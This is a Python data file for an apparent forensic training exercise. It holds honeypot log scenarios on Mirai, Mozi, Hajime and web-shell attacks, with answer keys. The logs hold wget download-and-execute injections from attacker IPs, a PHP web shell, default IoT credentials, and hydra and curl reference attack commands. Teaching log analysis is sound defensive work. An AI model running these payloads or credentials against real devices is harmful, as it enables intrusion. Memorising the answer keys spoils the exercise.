# ============================================================================
# forensic/scenarios.py — Historical Threat Archive
# ============================================================================
# Each scenario is a self-contained forensic case.
# Difficulty scaling:
#   Beginner:     Same attacker IP across all malicious lines (easy to filter)
#   Intermediate: Multiple attacker IPs + noise from same IP ranges
#   Advanced:     Mixed IPs + noise injected from attacker IPs
# ============================================================================

SCENARIOS = {

    # ==================================================================
    # SCENARIO 1: The Mirai Scanner (Beginner)
    # - Same attacker IP pattern makes identification straightforward
    # - Focus: learning to read log format and spot POST /login patterns
    # ==================================================================
    'mirai_scanner': {
        'id': 'mirai_scanner',
        'title': 'The Mirai Scanner',
        'difficulty': 'Beginner',
        'difficulty_color': 'green',
        'icon': '🤖',
        'attack_type': 'Brute Force (T1110)',
        'botnet': 'Mirai',
        'mitre_id': 'T1110',
        'summary': 'Your Hikvision IP camera honeypot captured suspicious login attempts overnight. The SOC dashboard shows a spike in failed authentications. Investigate the raw logs to identify the threat.',
        'learning_objectives': [
            'Identify brute force patterns in HTTP access logs',
            'Recognize Mirai botnet signatures (empty User-Agent, default credentials)',
            'Reconstruct credential stuffing commands from log evidence'
        ],

        'logs': [
            {'id': 0, 'malicious': False, 'raw': '192.168.1.50 - - [15/Mar/2026:02:14:01 +0000] "GET /favicon.ico HTTP/1.1" 200 1406 "http://192.168.10.128/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0"'},
            {'id': 1, 'malicious': False, 'raw': '192.168.1.50 - - [15/Mar/2026:02:14:02 +0000] "GET /assets/css/style.css HTTP/1.1" 200 3842 "http://192.168.10.128/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0"'},
            {'id': 2, 'malicious': False, 'raw': '66.249.68.100 - - [15/Mar/2026:02:14:05 +0000] "GET /robots.txt HTTP/1.1" 200 154 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"'},
            {'id': 3, 'malicious': True, 'raw': '185.220.101.1 - - [15/Mar/2026:02:14:08 +0000] "POST /login HTTP/1.1" 401 187 "-" ""',
             'payload': 'username=admin&password=admin', 'tool_hint': 'Empty User-Agent'},
            {'id': 4, 'malicious': True, 'raw': '185.220.101.1 - - [15/Mar/2026:02:14:09 +0000] "POST /login HTTP/1.1" 401 187 "-" ""',
             'payload': 'username=root&password=xc3511', 'tool_hint': 'Empty User-Agent'},
            {'id': 5, 'malicious': False, 'raw': '40.77.167.6 - - [15/Mar/2026:02:15:10 +0000] "GET / HTTP/1.1" 200 4821 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"'},
            {'id': 6, 'malicious': True, 'raw': '185.220.101.1 - - [15/Mar/2026:02:15:14 +0000] "POST /login HTTP/1.1" 401 187 "-" "Hello, world"',
             'payload': 'username=admin&password=7ujMko0admin', 'tool_hint': '"Hello, world" User-Agent'},
            {'id': 7, 'malicious': True, 'raw': '185.220.101.1 - - [15/Mar/2026:02:15:15 +0000] "POST /login HTTP/1.1" 401 187 "-" "Hello, world"',
             'payload': 'username=root&password=vizxv', 'tool_hint': '"Hello, world" User-Agent'},
            {'id': 8, 'malicious': True, 'raw': '185.220.101.1 - - [15/Mar/2026:02:15:16 +0000] "POST /login HTTP/1.1" 401 187 "-" "Hello, world"',
             'payload': 'username=admin&password=1234', 'tool_hint': '"Hello, world" User-Agent'},
            {'id': 9,  'malicious': False, 'raw': '192.168.1.50 - - [15/Mar/2026:02:20:30 +0000] "GET / HTTP/1.1" 200 4821 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0"'},
            {'id': 10, 'malicious': False, 'raw': '192.168.1.50 - - [15/Mar/2026:02:20:31 +0000] "GET /favicon.ico HTTP/1.1" 200 1406 "http://192.168.10.128/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0"'},
            {'id': 11, 'malicious': True, 'raw': '185.220.101.1 - - [15/Mar/2026:02:21:01 +0000] "POST /login HTTP/1.1" 401 187 "-" ""',
             'payload': 'username=root&password=root', 'tool_hint': 'Empty User-Agent'},
            {'id': 12, 'malicious': True, 'raw': '185.220.101.1 - - [15/Mar/2026:02:21:02 +0000] "POST /login HTTP/1.1" 401 187 "-" ""',
             'payload': 'username=admin&password=password', 'tool_hint': 'Empty User-Agent'},
            {'id': 13, 'malicious': True, 'raw': '185.220.101.1 - - [15/Mar/2026:02:21:03 +0000] "POST /login HTTP/1.1" 401 187 "-" ""',
             'payload': 'username=support&password=support', 'tool_hint': 'Empty User-Agent'},
            {'id': 14, 'malicious': False, 'raw': '54.236.1.11 - - [15/Mar/2026:02:25:00 +0000] "GET /health HTTP/1.1" 200 2 "-" "UptimeRobot/2.0"'},
        ],

        'step1_answer': {3, 4, 6, 7, 8, 11, 12, 13},
        'step1_threshold': 6,
        'step2_attack_type': 'Brute Force',
        'step2_botnet': 'Mirai',

        'step3_validations': [
            {'tool': 'hydra',  'required': ['hydra', 'http-post-form', '/login'], 'description': 'Hydra brute force command'},
            {'tool': 'curl',   'required': ['curl', 'POST', '/login', 'username='], 'description': 'curl credential test'},
        ],
        'step3_reference_command': 'hydra -L users.txt -P passwords.txt 192.168.10.128 http-post-form "/login:username=^USER^&password=^PASS^:F=error"',

        'explanations': {
            'step1': '<strong>Key Indicators:</strong> The malicious lines all share: (1) <code>POST /login</code> returning <code>401</code> status, (2) Empty User-Agent strings or the "Hello, world" Mirai signature, (3) Rapid-fire attempts from the same IP within seconds. Noise traffic uses normal browser User-Agents with <code>GET</code> requests and <code>200</code> status codes.',
            'step2': '<strong>Mirai Botnet Profile:</strong> Mirai is an IoT botnet discovered in 2016 that infected over 600,000 devices. Its source code contains 62 hardcoded default credentials (admin/admin, root/xc3511, admin/7ujMko0admin, root/vizxv). The empty and "Hello, world" User-Agent strings are Mirai scanner fingerprints.',
            'step3': '<strong>Command Reconstruction:</strong> The attacker bot automated these login attempts using credential lists. Reconstructing the command reveals the attack scope — tools like Hydra can test thousands of credentials per minute against IoT login pages.'
        }
    },

    # ==================================================================
    # SCENARIO 2: The Mozi Infiltrator (Intermediate)
    # - Multiple different attacker IPs (can't just filter one IP)
    # - Must read URL path + payload to identify attacks
    # ==================================================================
    'mozi_infiltrator': {
        'id': 'mozi_infiltrator',
        'title': 'The Mozi Infiltrator',
        'difficulty': 'Intermediate',
        'difficulty_color': 'yellow',
        'icon': '🐛',
        'attack_type': 'Command Injection (T1059)',
        'botnet': 'Mozi',
        'mitre_id': 'T1059',
        'summary': 'Your TP-Link router honeypot logged unusual CGI requests containing shell commands from multiple source IPs. The payloads appear to download external binaries. Investigate whether this is a coordinated botnet campaign.',
        'learning_objectives': [
            'Identify command injection patterns across multiple source IPs',
            'Recognize Mozi botnet download-and-execute payloads',
            'Distinguish between legitimate CGI access and malicious exploitation'
        ],

        'logs': [
            {'id': 0, 'malicious': False, 'raw': '192.168.1.50 - - [16/Mar/2026:08:30:01 +0000] "GET / HTTP/1.1" 200 4821 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1"'},
            {'id': 1, 'malicious': False, 'raw': '66.249.68.100 - - [16/Mar/2026:08:30:05 +0000] "GET /robots.txt HTTP/1.1" 200 154 "-" "Googlebot/2.1"'},

            # Attacker A — IP #1
            {'id': 2, 'malicious': True, 'raw': '103.152.118.120 - - [16/Mar/2026:08:30:12 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+/tmp;wget+http://103.152.118.120/mozi.m+-O+mozi;chmod+777+mozi;./mozi) HTTP/1.1" 404 0 "-" "Hello, World"',
             'payload': 'cd /tmp; wget http://103.152.118.120/mozi.m -O mozi; chmod 777 mozi; ./mozi', 'tool_hint': 'Mozi P2P botnet propagation'},

            {'id': 3, 'malicious': False, 'raw': '192.168.1.50 - - [16/Mar/2026:08:31:00 +0000] "GET /favicon.ico HTTP/1.1" 200 1406 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1"'},
            {'id': 4, 'malicious': False, 'raw': '54.236.1.11 - - [16/Mar/2026:08:31:30 +0000] "GET /health HTTP/1.1" 200 2 "-" "UptimeRobot/2.0"'},

            # Attacker B — different IP
            {'id': 5, 'malicious': True, 'raw': '61.177.172.136 - - [16/Mar/2026:08:32:05 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=cd+/tmp;wget+http://61.177.172.136/mozi.a+-O+bot;chmod+777+bot;./bot&curpath=/&currentsetting.htm=1 HTTP/1.1" 404 0 "-" "Mozi"',
             'payload': 'cd /tmp; wget http://61.177.172.136/mozi.a -O bot; chmod 777 bot; ./bot', 'tool_hint': 'Netgear setup.cgi RCE (CVE-2016-6277)'},

            # Noise from an IP in similar range — forces reading the request, not just the IP
            {'id': 6, 'malicious': False, 'raw': '61.177.172.200 - - [16/Mar/2026:08:33:00 +0000] "GET /status HTTP/1.1" 200 342 "-" "Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0"'},

            # Attacker C — yet another IP
            {'id': 7, 'malicious': True, 'raw': '222.186.180.130 - - [16/Mar/2026:08:34:10 +0000] "POST /HNAP1/ HTTP/1.1" 404 0 "-" "Mozi"',
             'payload': '<?xml version="1.0"?><soap:Body><Action>http://purenetworks.com/HNAP1/`cd /tmp; wget http://222.186.180.130/mozi.arm -O d; chmod 777 d; ./d`</Action></soap:Body>', 'tool_hint': 'D-Link HNAP1 RCE (CVE-2015-2051)'},

            {'id': 8,  'malicious': False, 'raw': '40.77.167.6 - - [16/Mar/2026:08:35:00 +0000] "GET / HTTP/1.1" 200 4821 "-" "bingbot/2.0"'},

            # Noise — legitimate user browsing from IP close to attacker A
            {'id': 9,  'malicious': False, 'raw': '103.152.118.55 - - [16/Mar/2026:08:38:00 +0000] "GET / HTTP/1.1" 200 4821 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0"'},
            {'id': 10, 'malicious': False, 'raw': '192.168.1.50 - - [16/Mar/2026:08:40:00 +0000] "GET / HTTP/1.1" 200 4821 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1"'},

            # Attacker A returns
            {'id': 11, 'malicious': True, 'raw': '103.152.118.120 - - [16/Mar/2026:08:41:20 +0000] "GET /cgi-bin/admin.cgi?Command=Execute&Cmd=cd+/tmp;wget+http://103.152.118.120/mozi.mips+-O+run;chmod+777+run;./run HTTP/1.1" 404 0 "-" "Hello, World"',
             'payload': 'cd /tmp; wget http://103.152.118.120/mozi.mips -O run; chmod 777 run; ./run', 'tool_hint': 'Realtek SDK RCE (CVE-2014-8361)'},

            {'id': 12, 'malicious': False, 'raw': '192.168.1.22 - - [16/Mar/2026:08:45:00 +0000] "GET /firmware HTTP/1.1" 200 1234 "-" "Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0"'},
        ],

        'step1_answer': {2, 5, 7, 11},
        'step1_threshold': 3,
        'step2_attack_type': 'Command Injection',
        'step2_botnet': 'Mozi',

        'step3_validations': [
            {'tool': 'curl', 'required': ['curl', 'cgi-bin', 'wget', 'mozi'], 'description': 'curl reproducing CGI injection'},
            {'tool': 'curl', 'required': ['curl', 'setup.cgi', 'cmd='], 'description': 'curl targeting setup.cgi'},
        ],
        'step3_reference_command': 'curl "http://192.168.10.128/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+/tmp;wget+http://attacker/mozi.m+-O+mozi;chmod+777+mozi;./mozi)"',

        'explanations': {
            'step1': '<strong>Key Indicators:</strong> Unlike the beginner scenario, attacks come from <strong>3 different IPs</strong> (103.152.118.120, 61.177.172.136, 222.186.180.130). You cannot rely on filtering a single IP. Instead, look for: (1) CGI endpoints in the URL (<code>/cgi-bin/luci</code>, <code>/setup.cgi</code>, <code>/HNAP1/</code>), (2) Shell command chains in parameters (<code>cd /tmp; wget ...; chmod 777 ...; ./</code>), (3) "Mozi" or "Hello, World" User-Agents. Note: line 7 is from <code>61.177.172.<strong>200</strong></code> — a different host in the same /24 range as attacker B — making a normal GET request. IP proximity alone is not proof of malicious intent.',
            'step2': '<strong>Mozi Botnet Profile:</strong> Mozi is a P2P IoT botnet (2019) that peaked at 1.5 million nodes. It exploits known CGI RCE vulnerabilities: Netgear setup.cgi (CVE-2016-6277), D-Link HNAP1 (CVE-2015-2051), and Realtek SDK (CVE-2014-8361). The payload always follows: <code>cd /tmp → wget binary → chmod 777 → execute</code>.',
            'step3': '<strong>Command Reconstruction:</strong> The Mozi payload is embedded entirely in the URL query string. The attacker sends a GET request where a CGI parameter contains shell commands. The vulnerable device\'s CGI handler passes this to a shell without sanitization.'
        }
    },

    # ==================================================================
    # SCENARIO 3: The Hajime Rival (Intermediate)
    # - Multiple attack phases from different IPs
    # ==================================================================
    'hajime_rival': {
        'id': 'hajime_rival',
        'title': 'The Hajime Rival',
        'difficulty': 'Intermediate',
        'difficulty_color': 'yellow',
        'icon': '🕷️',
        'attack_type': 'Reconnaissance (T1595)',
        'botnet': 'Hajime',
        'mitre_id': 'T1595',
        'summary': 'Your honeypot detected systematic probing across multiple ports and paths from several IP addresses, followed by targeted login attempts. The scanning pattern suggests an advanced IoT botnet performing multi-phase reconnaissance.',
        'learning_objectives': [
            'Distinguish reconnaissance scans from normal web traffic',
            'Identify multi-phase attack patterns across multiple IPs',
            'Recognize Hajime botnet behavior and compare with Mirai'
        ],

        'logs': [
            {'id': 0, 'malicious': False, 'raw': '192.168.1.50 - - [17/Mar/2026:14:00:01 +0000] "GET / HTTP/1.1" 200 4821 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0"'},

            # Recon phase — Scanner IP #1
            {'id': 1, 'malicious': True, 'raw': '167.94.138.126 - - [17/Mar/2026:14:00:05 +0000] "GET / HTTP/1.1" 200 4821 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"',
             'payload': '', 'tool_hint': 'Nmap service detection'},
            {'id': 2, 'malicious': True, 'raw': '167.94.138.126 - - [17/Mar/2026:14:00:06 +0000] "GET /HNAP1/ HTTP/1.1" 200 543 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine)"',
             'payload': '', 'tool_hint': 'Nmap D-Link HNAP detection'},
            {'id': 3, 'malicious': True, 'raw': '71.6.199.23 - - [17/Mar/2026:14:00:07 +0000] "GET /ISAPI/System/deviceInfo HTTP/1.1" 200 412 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine)"',
             'payload': '', 'tool_hint': 'Nmap Hikvision detection — different scanner IP'},

            {'id': 4, 'malicious': False, 'raw': '66.249.68.100 - - [17/Mar/2026:14:01:00 +0000] "GET /sitemap.xml HTTP/1.1" 200 298 "-" "Googlebot/2.1"'},
            {'id': 5, 'malicious': False, 'raw': '192.168.1.50 - - [17/Mar/2026:14:01:30 +0000] "GET /favicon.ico HTTP/1.1" 200 1406 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0"'},

            # Enumeration phase — Scanner IP #2
            {'id': 6, 'malicious': True, 'raw': '71.6.199.23 - - [17/Mar/2026:14:02:01 +0000] "GET /admin HTTP/1.1" 404 0 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine)"',
             'payload': '', 'tool_hint': 'Path enumeration'},
            {'id': 7, 'malicious': True, 'raw': '71.6.199.23 - - [17/Mar/2026:14:02:02 +0000] "GET /config.bin HTTP/1.1" 200 4096 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine)"',
             'payload': '', 'tool_hint': 'Config file download'},

            {'id': 8, 'malicious': False, 'raw': '54.236.1.11 - - [17/Mar/2026:14:05:00 +0000] "GET /health HTTP/1.1" 200 2 "-" "UptimeRobot/2.0"'},

            # Noise — legitimate user from similar IP range as scanner
            {'id': 9, 'malicious': False, 'raw': '167.94.138.200 - - [17/Mar/2026:14:05:20 +0000] "GET / HTTP/1.1" 200 4821 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/122.0"'},

            # Credential phase — Hajime bot with distinct agent
            {'id': 10, 'malicious': True, 'raw': '193.32.162.159 - - [17/Mar/2026:14:05:30 +0000] "POST /login HTTP/1.1" 401 187 "-" "Hajime"',
             'payload': 'username=root&password=root', 'tool_hint': 'Hajime login attempt'},
            {'id': 11, 'malicious': True, 'raw': '193.32.162.159 - - [17/Mar/2026:14:05:31 +0000] "POST /login HTTP/1.1" 401 187 "-" "Hajime"',
             'payload': 'username=admin&password=admin', 'tool_hint': 'Hajime login attempt'},
            {'id': 12, 'malicious': True, 'raw': '45.155.205.233 - - [17/Mar/2026:14:05:32 +0000] "POST /login HTTP/1.1" 401 187 "-" "Hajime"',
             'payload': 'username=root&password=5up', 'tool_hint': 'Hajime login — different source IP'},

            {'id': 13, 'malicious': False, 'raw': '192.168.1.22 - - [17/Mar/2026:14:10:00 +0000] "GET /status HTTP/1.1" 200 342 "-" "Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0"'},
        ],

        'step1_answer': {1, 2, 3, 6, 7, 10, 11, 12},
        'step1_threshold': 6,
        'step2_attack_type': 'Reconnaissance',
        'step2_botnet': 'Hajime',

        'step3_validations': [
            {'tool': 'nmap', 'required': ['nmap', '-sV', '192.168.10.128'], 'description': 'Nmap service version scan'},
            {'tool': 'nmap', 'required': ['nmap', '-sC', '192.168.10.128'], 'description': 'Nmap script scan'},
            {'tool': 'nmap', 'required': ['nmap', '80', '192.168.10.128'], 'description': 'Nmap port scan'},
        ],
        'step3_reference_command': 'nmap -sV -sC -p 80,443 192.168.10.128',

        'explanations': {
            'step1': '<strong>Key Indicators:</strong> Attacks come from <strong>4 different IPs</strong> (167.94.138.126, 71.6.199.23, 193.32.162.159, 45.155.205.233) across 3 attack phases. You cannot filter by a single IP. Look for: (1) Nmap NSE in User-Agent for recon, (2) probing IoT-specific paths (/HNAP1/, /ISAPI/, /config.bin), (3) "Hajime" User-Agent for credential attempts. Line 10 (167.94.138.<strong>200</strong>) is a trap — different host in the same /24 range as scanner #1, making a normal browser GET.',
            'step2': '<strong>Hajime Botnet Profile:</strong> Hajime (2016) is a decentralized IoT botnet using BitTorrent P2P. Unlike Mirai\'s spray-and-pray approach, Hajime performs multi-phase attacks: reconnaissance → enumeration → exploitation. It has been called the "vigilante botnet" because some variants close vulnerable ports on infected devices.',
            'step3': '<strong>Command Reconstruction:</strong> The recon phase maps to Nmap with service detection (-sV) and default scripts (-sC). The multi-phase methodology — scan first, then target — is more sophisticated than Mirai\'s direct credential stuffing.'
        }
    },

    # ==================================================================
    # SCENARIO 4: The Web Shell Drop (Advanced)
    # - Mixed IPs with noise from attacker IP ranges
    # - Attacker uses same User-Agent as legitimate traffic
    # - Must rely on methods, paths, and payload content
    # ==================================================================
    'webshell_drop': {
        'id': 'webshell_drop',
        'title': 'The Web Shell Drop',
        'difficulty': 'Advanced',
        'difficulty_color': 'red',
        'icon': '💀',
        'attack_type': 'Malicious Upload (T1105)',
        'botnet': 'Generic APT',
        'mitre_id': 'T1105',
        'summary': 'Your router honeypot captured POST requests targeting upload endpoints. The attacker uses a standard python-requests User-Agent — the same library used by many legitimate API clients. You cannot rely on IP or User-Agent alone. Focus on HTTP methods, target paths, and response codes.',
        'learning_objectives': [
            'Identify malicious uploads when User-Agent is not distinctive',
            'Analyze HTTP method + path + status code combinations',
            'Recognize web shell signatures in POST payloads'
        ],

        'logs': [
            {'id': 0, 'malicious': False, 'raw': '192.168.1.50 - - [18/Mar/2026:22:00:01 +0000] "GET / HTTP/1.1" 200 4821 "-" "Mozilla/5.0 (Windows NT 10.0) Chrome/122.0"'},
            {'id': 1, 'malicious': False, 'raw': '192.168.1.50 - - [18/Mar/2026:22:00:02 +0000] "GET /favicon.ico HTTP/1.1" 200 1406 "-" "Mozilla/5.0 (Windows NT 10.0) Chrome/122.0"'},

            # Attack: directory probing
            {'id': 2, 'malicious': True, 'raw': '193.32.162.159 - - [18/Mar/2026:22:01:05 +0000] "GET /wp-admin HTTP/1.1" 404 0 "-" "python-requests/2.31.0"',
             'payload': '', 'tool_hint': 'Probing for WordPress admin'},
            {'id': 3, 'malicious': True, 'raw': '185.220.101.45 - - [18/Mar/2026:22:01:06 +0000] "GET /filemanager HTTP/1.1" 404 0 "-" "python-requests/2.31.0"',
             'payload': '', 'tool_hint': 'Probing for file manager'},

            {'id': 4, 'malicious': False, 'raw': '66.249.68.100 - - [18/Mar/2026:22:02:00 +0000] "GET /robots.txt HTTP/1.1" 200 154 "-" "Googlebot/2.1"'},

            # Noise — legitimate API client using same python-requests agent
            {'id': 5, 'malicious': False, 'raw': '192.168.1.100 - - [18/Mar/2026:22:02:30 +0000] "GET /api/status HTTP/1.1" 200 45 "-" "python-requests/2.31.0"'},

            # Attack: PHP shell upload
            {'id': 6, 'malicious': True, 'raw': '193.32.162.159 - - [18/Mar/2026:22:03:10 +0000] "POST /firmware HTTP/1.1" 405 0 "-" "python-requests/2.31.0"',
             'payload': 'Content-Disposition: form-data; name="file"; filename="shell.php"\r\n<?php system($_GET["cmd"]); ?>', 'tool_hint': 'Simple PHP web shell upload'},
            {'id': 7, 'malicious': True, 'raw': '45.155.205.233 - - [18/Mar/2026:22:03:15 +0000] "POST /upgrade HTTP/1.1" 405 0 "-" "python-requests/2.31.0"',
             'payload': 'Content-Disposition: form-data; name="file"; filename="c99.php"\r\n<?php eval(base64_decode(...)); ?>', 'tool_hint': 'c99 web shell upload'},

            {'id': 8, 'malicious': False, 'raw': '192.168.1.22 - - [18/Mar/2026:22:05:00 +0000] "GET /status HTTP/1.1" 200 342 "-" "Mozilla/5.0 Firefox/121.0"'},
            {'id': 9, 'malicious': False, 'raw': '54.236.1.11 - - [18/Mar/2026:22:05:30 +0000] "GET /health HTTP/1.1" 200 2 "-" "UptimeRobot/2.0"'},

            # Noise — attacker IP making a normal-looking GET (false flag)
            {'id': 10, 'malicious': False, 'raw': '193.32.162.159 - - [18/Mar/2026:22:05:45 +0000] "GET / HTTP/1.1" 200 4821 "-" "python-requests/2.31.0"'},

            # Attack: more uploads from new IPs
            {'id': 11, 'malicious': True, 'raw': '103.152.118.120 - - [18/Mar/2026:22:06:20 +0000] "POST /cgi-bin/upload.cgi HTTP/1.1" 404 0 "-" "python-requests/2.31.0"',
             'payload': 'Content-Disposition: form-data; name="file"; filename="b374k.php"\r\n<?php ...b374k shell... ?>', 'tool_hint': 'b374k web shell upload'},
            {'id': 12, 'malicious': True, 'raw': '218.92.0.107 - - [18/Mar/2026:22:06:25 +0000] "POST /admin/upload HTTP/1.1" 404 0 "-" "python-requests/2.31.0"',
             'payload': 'Content-Disposition: form-data; name="firmware"; filename="backdoor.jsp"', 'tool_hint': 'JSP backdoor upload'},

            {'id': 13, 'malicious': False, 'raw': '40.77.167.6 - - [18/Mar/2026:22:10:00 +0000] "GET / HTTP/1.1" 200 4821 "-" "bingbot/2.0"'},
            {'id': 14, 'malicious': False, 'raw': '192.168.1.50 - - [18/Mar/2026:22:15:00 +0000] "GET / HTTP/1.1" 200 4821 "-" "Mozilla/5.0 (Windows NT 10.0) Chrome/122.0"'},
        ],

        'step1_answer': {2, 3, 6, 7, 11, 12},
        'step1_threshold': 4,
        'step2_attack_type': 'Malicious Upload',
        'step2_botnet': 'Generic APT',

        'step3_validations': [
            {'tool': 'curl', 'required': ['curl', 'POST', '-F', 'file=', '.php'], 'description': 'curl file upload command'},
            {'tool': 'curl', 'required': ['curl', 'POST', 'firmware', 'filename='], 'description': 'curl firmware upload'},
            {'tool': 'python', 'required': ['python', 'requests', 'post', 'files'], 'description': 'Python requests upload'},
        ],
        'step3_reference_command': 'curl -X POST "http://192.168.10.128/firmware" -F "file=@shell.php"',

        'explanations': {
            'step1': '<strong>Key Indicators:</strong> This is the hardest scenario because: (1) Attacks come from <strong>5 different IPs</strong>, (2) The User-Agent (<code>python-requests/2.31.0</code>) is shared with legitimate API traffic (line 6), (3) Line 11 is a <strong>false flag</strong> — the same attacker IP (193.32.162.159) making a normal GET request. You must focus on the combination of <code>POST</code> method + upload-related paths (<code>/firmware</code>, <code>/upgrade</code>, <code>/upload.cgi</code>) + non-200 status codes (405, 404).',
            'step2': '<strong>Web Shell Attack Profile:</strong> Web shells (c99, b374k) are persistent backdoors uploaded to web servers. The attacker targets IoT firmware update endpoints because these accept file uploads and often lack validation. Unlike botnets, this pattern suggests a targeted intrusion seeking persistent access.',
            'step3': '<strong>Command Reconstruction:</strong> The attacker used Python\'s requests library for automated upload attempts. The <code>-F</code> flag in curl sends multipart form data. In a real incident, the reconstructed command helps verify whether the vulnerability is exploitable.'
        }
    },
}


def get_scenario(scenario_id):
    return SCENARIOS.get(scenario_id)


def get_all_scenarios():
    return [
        {
            'id': s['id'],
            'title': s['title'],
            'difficulty': s['difficulty'],
            'difficulty_color': s['difficulty_color'],
            'icon': s['icon'],
            'attack_type': s['attack_type'],
            'botnet': s['botnet'],
            'summary': s['summary'],
            'log_count': len(s['logs']),
            'malicious_count': len(s['step1_answer']),
        }
        for s in SCENARIOS.values()
    ]